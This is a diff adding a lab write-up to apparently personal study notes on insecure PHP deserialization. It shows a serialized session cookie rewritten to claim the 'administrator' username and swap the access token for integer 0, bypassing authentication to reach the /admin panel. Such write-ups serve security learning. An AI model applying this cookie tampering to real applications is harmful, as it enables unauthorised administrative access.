@@ -22,3 +22,15 @@ If you have source code access, you should start by looking for unserialize() an
 
 
 ----------------------------------------------------------------------------------------------------
+
+#2 Lab: Modifying serialized data types
+
+     1. Send any request to repeater and analyze the cookie.
+     2. Normal request : O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"d50lecyygdm54oihdadp5h939veq2er1";}
+        Modified request: O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+     3. Things we hav changed is :-
+        s= length of uname so change it accordingly of administrator
+        removed access token and changed it to i:0 and modified its length to 12
+    4. After modifying the cookie, we can see that we are logged in as administrator and we can access the admin panel on /admin path
+
+----------------------------------------------------------------------------------------------------
